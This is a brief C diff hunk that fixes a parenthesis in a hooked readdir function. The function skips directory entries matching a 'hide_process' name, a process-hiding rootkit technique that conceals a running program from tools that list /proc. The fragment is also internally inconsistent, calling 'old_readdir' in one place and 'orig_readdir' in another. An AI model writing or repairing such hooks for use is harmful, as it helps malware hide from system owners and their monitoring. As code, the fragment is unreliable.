@@ -20,7 +20,7 @@ struct dirent *readdir (DIR * dirp){
 
    struct dirent* ret = old_readdir(dirp);
    
-   while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0))){
+   while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0)){
       ret = orig_readdir (dirp);
    }
    return ret;
